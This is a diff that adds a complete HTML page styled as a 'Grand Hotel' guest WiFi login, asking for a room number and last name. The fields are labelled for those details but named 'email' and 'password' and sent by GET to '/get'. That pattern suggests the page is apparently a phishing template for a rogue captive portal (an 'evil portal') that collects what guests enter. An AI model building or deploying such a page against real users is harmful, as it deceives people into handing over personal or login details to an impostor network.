@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grand Hotel - Guest WiFi</title>
+    <style>
+        body {
+            font-family: 'Georgia', serif;
+            background: linear-gradient(135deg, #d4a574 0%, #8b6914 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            border: 3px solid #d4a574;
+        }
+        .hotel-logo {
+            font-size: 64px;
+            margin-bottom: 10px;
+        }
+        .hotel-name {
+            color: #8b6914;
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-style: italic;
+            font-size: 16px;
+        }
+        .welcome-text {
+            background: #f8f6f0;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            border-left: 4px solid #d4a574;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #8b6914;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e8e0d0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s;
+            box-sizing: border-box;
+            background: #fafafa;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #d4a574;
+            background: white;
+            box-shadow: 0 0 10px rgba(212, 165, 116, 0.2);
+        }
+        .access-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #d4a574 0%, #8b6914 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .access-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(212, 165, 116, 0.4);
+        }
+        .amenities {
+            margin-top: 25px;
+            padding: 15px;
+            background: #f8f6f0;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #666;
+        }
+        .amenities h4 {
+            color: #8b6914;
+            margin-bottom: 8px;
+        }
+        .loading {
+            display: none;
+            margin-top: 15px;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #d4a574;
+            border-radius: 50%;
+            width: 25px;
+            height: 25px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .room-info {
+            display: flex;
+            gap: 10px;
+        }
+        .room-info input {
+            flex: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="hotel-logo">🏨</div>
+        <div class="hotel-name">GRAND HOTEL</div>
+        <p class="subtitle">Luxury • Comfort • Excellence</p>
+        
+        <div class="welcome-text">
+            <strong>Welcome, Valued Guest!</strong><br>
+            Enjoy complimentary high-speed internet access throughout your stay.
+        </div>
+        
+        <form action="/get" method="GET" id="loginForm">
+            <div class="form-group">
+                <label for="email">Room Number</label>
+                <input type="text" id="email" name="email" placeholder="e.g., 1205" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Guest Last Name</label>
+                <input type="password" id="password" name="password" placeholder="As registered at check-in" required>
+            </div>
+            
+            <button type="submit" class="access-btn">Access Internet</button>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Connecting to hotel network...</p>
+            </div>
+        </form>
+        
+        <div class="amenities">
+            <h4>🌟 Complimentary Services</h4>
+            • High-speed WiFi in all areas<br>
+            • 24/7 room service available<br>
+            • Concierge assistance<br>
+            • Business center access
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function() {
+            document.querySelector('.access-btn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+        });
+        
+        // Auto-format room number
+        document.getElementById('email').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.slice(0, 4);
+            e.target.value = value;
+        });
+    </script>
+</body>
+</html>
